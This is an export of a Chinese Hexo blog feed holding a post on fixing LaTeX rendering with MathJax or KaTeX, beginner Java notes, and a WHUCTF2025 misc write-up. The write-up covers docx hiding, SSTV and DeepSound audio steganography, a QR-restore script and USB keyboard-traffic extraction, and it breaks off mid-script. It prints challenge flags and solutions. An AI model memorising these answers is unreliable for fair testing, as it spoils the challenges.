    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近写ctf密码学博客时遇见了许多问题，Latex渲染错位&#x2F;不渲染，导致博客无法正常观看，于是我在网上找了许多教程，也找了大佬咨询，但人与人的悲欢并不相同，最后找了一种比较原始的方法，才解决了我的问题，如果有人跟我有相同的困扰，可以参考参考。</p><h2 id="遇见的问题"><a href="#遇见的问题" class="headerlink" title="遇见的问题"></a>遇见的问题</h2><p>首先记录一下我遇见的问题，开始默认的latex渲染器不能完全渲染，后来照着网上教程使用了<code>hexo-renderer-markdown-it-plus</code>+<code>katex</code> 然鹅并没有解决我的问题。<br>后来在大佬的指点下使用了更为稳定的<code>hexo-renderer-kramed</code>+<code>mathjax</code>，但是不知道是CDN的问题问题还是怎样，在本地部署时能好好的，但是在部署到远端服务器之后，网页还是渲染失败，查看了一下控制台， 发现CDN默认访问<code>http</code>，由于<code>https</code>和<code>http</code>不能混用，一般浏览器默认会拒绝访问，若你在浏览器左上角<strong>小锁</strong>的<strong>此网站权限</strong>中将<strong>不安全内容</strong>设为开启，便能渲染成功。（我暂时没找到这个方案的解决办法，有解决办法的师傅可以评论区告诉我。。。）</p><h2 id="引入脚本解决Latex渲染问题"><a href="#引入脚本解决Latex渲染问题" class="headerlink" title="引入脚本解决Latex渲染问题"></a>引入脚本解决Latex渲染问题</h2><p>最后，我使用了引入<code>javascript</code>脚本的方法解决了这个问题，下面介绍具体实现方法。</p><ul><li>首先，检查markdown渲染环境，最好使用默认的<code>hexo-renderer-marked</code> ,如果有其他的，最好先卸载掉，否则会出现渲染冲突的问题</li></ul><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> uninstall hexo-renderer-kramed<br><span class="hljs-built_in">npm</span> uninstall hexo-renderer-pandoc<br><br><span class="hljs-built_in">npm</span> install hexo-renderer-marked<br></code></pre></td></tr></table></figure><blockquote><p>如果你是默认设置的话，就没必要做这一步了。</p></blockquote><ul><li>引入脚本，这里分两种方式<ul><li>一、在博客文章的md文件中引入<code>javascript</code>脚本，推荐写好模板，在需要数学公式的博客文章直接引入模板。</li><li>二、<code>hexo 5.0</code>以上的可以使用注入器，可在<code>/themes/fluid/scripts</code>中添加<code>js</code>文件，下面两个任选其一。<br><code>mathjax.js</code></li></ul></li></ul><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gml">hexo.extend.injector.register(<span class="hljs-string">&#x27;body_end&#x27;</span>, `<br>&lt;<span class="hljs-variable language_">script</span>&gt;  <br>MathJax = &#123;  <br>tex: &#123;  <br>inlineMath: [[<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>], [<span class="hljs-string">&#x27;\\(&#x27;</span>, <span class="hljs-string">&#x27;\\)&#x27;</span>]]  <br>&#125;  <br>&#125;;  <br>&lt;/<span class="hljs-variable language_">script</span>&gt;  <br>&lt;<span class="hljs-variable language_">script</span> <span class="hljs-variable language_">id</span>=<span class="hljs-string">&quot;MathJax-script&quot;</span> async  <br>src=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js&quot;</span>&gt;  <br>&lt;/<span class="hljs-variable language_">script</span>&gt;<br>`, <span class="hljs-string">&#x27;default&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>katex.js</code></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xquery">hexo.extend.injector.register(<span class="hljs-string">&#x27;body_end&#x27;</span>, `<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-GvrOXuhMATgEsSwCs4smul74iXGOixntILdUW9XmUC6+HX0sLNAK3q71HotJqlAn&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">defer</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-cpW21h6RZv/phavutF+AuVYrr+dA8xD9zs6FwLpaCct6O9ctzYFfFr4dgmgccOTx&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;script defer src=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js&quot;</span> integrity=<span class="hljs-string">&quot;sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;DOMContentLoaded&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">        renderMathInElement<span class="hljs-built_in">(document</span>.body, &#123;</span><br><span class="language-xquery">          // customised options</span><br><span class="language-xquery">          // • auto-render specific keys, e.g.:</span><br><span class="language-xquery">        delimiters: [</span><br><span class="language-xquery">            &#123;left: <span class="hljs-string">&#x27;$$&#x27;</span>, right: <span class="hljs-string">&#x27;$$&#x27;</span>, display:<span class="hljs-built_in"> true</span>&#125;</span><span class="language-xml">,</span><br><span class="language-xml">            </span><span class="language-xquery">&#123;left: <span class="hljs-string">&#x27;$&#x27;</span>, right: <span class="hljs-string">&#x27;$&#x27;</span>, display:<span class="hljs-built_in"> false</span>&#125;</span><span class="language-xml"><span class="language-javascript">,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-comment">//</span></span></span><span class="language-xquery">&#123;left: <span class="hljs-string">&#x27;\\(&#x27;</span>, right: <span class="hljs-string">&#x27;\\)&#x27;</span>, display:<span class="hljs-built_in"> false</span>&#125;</span><span class="language-xml"><span class="language-javascript">,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-comment">//</span></span></span><span class="language-xquery">&#123;left: <span class="hljs-string">&#x27;\\[&#x27;</span>, right: <span class="hljs-string">&#x27;\\]&#x27;</span>, display:<span class="hljs-built_in"> true</span>&#125;</span><span class="language-xml"><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">        ],</span></span><br><span class="language-javascript"><span class="language-xml">          <span class="hljs-comment">// • rendering keys, e.g.:</span></span></span><br><span class="language-javascript"><span class="language-xml">        throwOnError : <span class="hljs-literal">false</span></span></span><br><span class="language-javascript"><span class="language-xml">        &#125;);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>`, <span class="hljs-string">&#x27;default&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li>注意，在使用矩阵时，外部可用<code>&lt;sapn&gt;&lt;/sapn&gt;</code> 或<code>&lt;div&gt;&lt;/div&gt;</code>包裹，以解决<code>\\</code>的转义问题。</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;span&gt;<br>$$<br> <span class="hljs-string">\begin&#123;bmatrix&#125;</span><br><span class="hljs-number">2</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-string">\cdots</span> &amp; m_1<span class="hljs-string">\\</span><br><span class="hljs-number">0</span> &amp; <span class="hljs-number">2</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-string">\cdots</span> &amp; m_2<span class="hljs-string">\\</span><br><span class="hljs-number">0</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-number">2</span> &amp; <span class="hljs-string">\cdots</span> &amp; m_3<span class="hljs-string">\\</span><br><span class="hljs-string">\vdots</span> &amp; <span class="hljs-string">\vdots</span> &amp; <span class="hljs-string">\vdots</span> &amp; <span class="hljs-string">\ddots</span> &amp; <span class="hljs-string">\vdots\\</span><br><span class="hljs-number">1</span> &amp; <span class="hljs-number">1</span> &amp; <span class="hljs-number">1</span> &amp; <span class="hljs-string">\cdots</span> &amp; <span class="hljs-number">1</span><span class="hljs-string">\\</span><br><span class="hljs-string">\end&#123;bmatrix&#125;</span><br>$$<br>&lt;/span&gt;<br></code></pre></td></tr></table></figure><p>未加<code>&lt;span&gt;&lt;/span&gt;</code>:</p><p>$$<br>\begin{bmatrix}<br>2 &amp; 0 &amp; 0 &amp; \cdots &amp; m_1\<br>0 &amp; 2 &amp; 0 &amp; \cdots &amp; m_2\<br>0 &amp; 0 &amp; 2 &amp; \cdots &amp; m_3\<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots\<br>1 &amp; 1 &amp; 1 &amp; \cdots &amp; 1\<br>\end{bmatrix}<br>$$</p><p>加了<code>&lt;span&gt;&lt;/span&gt;</code>:</p><span>$$ \begin{bmatrix}2 & 0 & 0 & \cdots & m_1\\0 & 2 & 0 & \cdots & m_2\\0 & 0 & 2 & \cdots & m_3\\\vdots & \vdots & \vdots & \ddots & \vdots\\1 & 1 & 1 & \cdots & 1\\\end{bmatrix}$$</span><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这确实是个挺原始的方法，虽然写矩阵时有点小麻烦，但确实挺好用，如果你有什么更好的方法，可用告诉我，有什么问题也欢迎提出。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.kevinchu.top/2023/09/12/hexo-supports-latex/">Hexo支持LaTeX数学公式渲染 - KEVIN’S BLOG (kevinchu.top)</a></p>]]></content>
    
    
    <categories>
      
      <category>blog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>latex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java学习记录</title>
    <link href="/2025/04/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/04/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h1><p><strong>名字由来：</strong> 印度尼西亚一个盛产咖啡的岛名。<br><strong>特点：</strong> Java是一种简单的、面向对象的、分布式的、强壮的、安全的、体系结构中立的、可移植的、高性能的、多线程的和动态的语言。<br><strong>下载：</strong></p><ul><li>JDK</li><li>编辑器<br><strong>JDK环境工具：</strong></li><li><strong>编译器-javac：</strong> 将源程序（.java文件）编译成字节码（.class文件）。调用格式为<code>javac [选项] 源文件名表</code></li><li><strong>语言解释器-java：</strong> 解释执行Java字节码，格式为<code>java [选项]&lt;类名&gt;[参数表]</code></li><li><strong>交互式命令行-jshell</strong></li></ul><h2 id="具有输入功能的程序"><a href="#具有输入功能的程序" class="headerlink" title="具有输入功能的程序"></a>具有输入功能的程序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SayHelloToYou</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(reader);<br>        System.out.print(<span class="hljs-string">&quot;Enter your name:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> input.readLine();<br>        System.out.println(<span class="hljs-string">&quot;Hello,&quot;</span> + name + <span class="hljs-string">&quot;!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>运行结果：</strong><br><img src="/2025/04/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250424103740837.png"><br><strong>代码解释：</strong></p><ul><li><code>import java.io.*:</code>学过python的都知道这是导入包，导入<code>java.io</code>中的所有类，上述代码中包含在该包中的有<code>InputStreamReader</code>,<code>BufferedReader</code>,<code>IOException</code></li><li><code>IOException:</code>输入输出错误时会抛出<code>IOException</code>异常</li><li><code>InputStreamReader:</code>桥接器，将字节数据解码为字符数据</li><li><code>InputStreamReader:</code>装饰器，提供一个缓冲区，能同时从字符输入流中读取多个字符到缓冲区，提高读取效率。提供了<code>readline()</code>等方法。</li><li><code>print</code>和<code>println</code>区别：前者没有自动换行，后者有。</li></ul><h2 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h2><h3 id="命名规范："><a href="#命名规范：" class="headerlink" title="命名规范："></a>命名规范：</h3><ul><li><strong>包名：</strong> 全部小写，如io,awt</li><li><strong>类名：</strong> 首字母大写，如Hello</li><li><strong>变量名：</strong> 首字母小写，如userName</li><li><strong>方法名：</strong> 首字母小写，如setName</li></ul>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF2025 WP</title>
    <link href="/2025/03/31/WHUCTF%202025-WP/"/>
    <url>/2025/03/31/WHUCTF%202025-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到-益智游戏"><a href="#签到-益智游戏" class="headerlink" title="[签到]益智游戏"></a>[签到]益智游戏</h3><p><strong>1.数独</strong></p><p>数独还没做完，直接爆破就出了。</p><p><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20002907.png"></p><p>得到<code>WHUCTF&#123;Little_games_reall</code></p><p><strong>2.数织</strong></p><p>队友很强，直接手搓了。</p><p><img src="/2025/03/31/WHUCTF%202025-WP/85d0624f43dd995308622fd597fe31cc.jpg"></p><p>得到<code>y_train_your_brain_&amp;_play</code></p><p><strong>3.鬼脚图</strong></p><p>直接白给了。。。</p><p>得到<code>_more_in_cn.puzzle_website&#125;</code></p><h3 id="哪里有文档"><a href="#哪里有文档" class="headerlink" title="哪里有文档"></a>哪里有文档</h3><p>附件是一个docx文档，而且直接给出了part1。</p><p><strong>part2：</strong><code>ctrl+A</code>一下，发现在文章最后，改一下字体颜色就看到了。<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-29%20112623%201.png" alt="|525"></p><p><strong>part3：</strong><code>ctrl+F</code>一下，搜索part，发现一个非常隐秘的文本框，放大一下，找到part3<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20004431.png" alt="|525"><br><strong>part4：</strong> 由于docx文档本质是压缩包，可以解压出一个文件夹，在<code>docprops</code>文件夹下边的<code>custom</code>文件中发现part4.<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20004633.png"><br><strong>part5：</strong> 在<code>word</code>文件夹下边的<code>vbaProject.bin</code>文件中发现非疑似part5的字符串，后来试了一下还真是。<br><img src="/2025/03/31/WHUCTF%202025-WP/_posts/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20004817.png"><br><strong>解密器：</strong> 在文档页脚的地方发现有东西，换一下字体颜色便发现，<code>by Abracadabra encoder</code>，上网搜索之后发现是魔曰。</p><p><strong>解密步骤：</strong> 将5段part拼接后进行base64解码，得到一段文字，</p><p><code>鹏无局，无以致天，光有能听，竹有善然，虽无楼鸢之彰，亦报以畅看瀚水，求将与其家，而任想买以星者，星也，后曲之雨，选之霞而称之茶也，寒冰悠见，写者旅之，叶流而清梦看也，报在莹鹤。</code></p><p>放在魔曰解码器中解码得到flag</p><p><code>WHUCTF&#123;always_follow_your_heart&#125;</code></p><h3 id="行星防御理事会"><a href="#行星防御理事会" class="headerlink" title="行星防御理事会"></a>行星防御理事会</h3><p>附件为一个wav音频，放到Audacity中查看波形图，觉得类似sstv，放入RX-SSTV工具中<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-29%20164824.png" alt="|625"><br>发现有密码<code>2024-YR4</code>，联想需要密码的wav音频隐写，在Deepsound中输入密码后得到附件，解压后是一个变形过的二维码和一个变形脚本。编写恢复脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate</span>(<span class="hljs-params">m: <span class="hljs-built_in">int</span>, arr: np.ndarray</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;将数组分割为 m x m 块，并将每块顺时针旋转 90 度&quot;&quot;&quot;</span><br>    h, w = arr.shape<br>    new_arr = np.zeros_like(arr)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, h, m):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, w, m):<br>            block = arr[i:i + m, j:j + m]<br>            rotated_block = np.rot90(block, k=-<span class="hljs-number">1</span>)  <span class="hljs-comment"># 顺时针旋转90度</span><br>            new_arr[i:i + m, j:j + m] = rotated_block<br><br>    <span class="hljs-keyword">return</span> new_arr<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 读取图片</span><br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;QR_modified.png&quot;</span>).convert(<span class="hljs-string">&quot;L&quot;</span>)<br>    imgarr = (np.array(img) // <span class="hljs-number">255</span>).astype(np.uint8)<br>    imgarr = imgarr[::<span class="hljs-number">18</span>, ::<span class="hljs-number">18</span>]<br><br>    imgarr = rotate(<span class="hljs-number">5</span>, imgarr)<br><br>    <span class="hljs-comment"># 保存图片</span><br>    newimgarr = np.kron(imgarr, np.ones((<span class="hljs-number">18</span>, <span class="hljs-number">18</span>)))<br>    newimg = Image.fromarray(newimgarr * <span class="hljs-number">255</span>).convert(<span class="hljs-string">&quot;L&quot;</span>)<br>    newimg.save(<span class="hljs-string">&quot;QR.png&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片已保存为 QR.png&quot;</span>)<br><span class="hljs-comment">#WHUCTF&#123;much_ado_about_nothing&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-29%20171521.png" alt="|225"><br>扫码得到flag。</p><h3 id="青轴还是红轴"><a href="#青轴还是红轴" class="headerlink" title="青轴还是红轴"></a>青轴还是红轴</h3><p>wireshark打开附件，发现全是USB协议流量，结合题目猜测是键盘流量。</p><p>在kali中使用tshark提取键盘流量</p><p><code>tshark -r raw_keyboard.pcapng -T fields -e usbhid.data &gt; usbdata.txt</code></p><p>然后用脚本对提取出的流量进行处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>            <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>            <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>            <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>            <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>            <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>            <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span 